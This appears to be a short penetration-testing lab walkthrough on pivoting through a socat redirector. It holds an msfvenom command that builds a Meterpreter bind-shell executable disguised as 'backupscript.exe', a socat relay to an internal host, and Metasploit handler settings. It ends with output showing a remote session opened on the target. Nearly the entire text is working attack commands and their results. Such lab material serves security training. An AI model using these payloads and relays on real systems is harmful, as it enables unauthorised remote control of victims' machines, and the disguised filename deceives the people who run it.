#### Creating the Windows Payload
```shell
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```
#### Starting Socat Bind Shell Listener
```shell
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```
#### Configuring & Starting the Bind multi/handler
```shell
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.202.64
set LPORT 8080
run
```
#### Establishing Meterpreter Session
```shell
[*] Sending stage (200262 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500

meterpreter > getuid
```
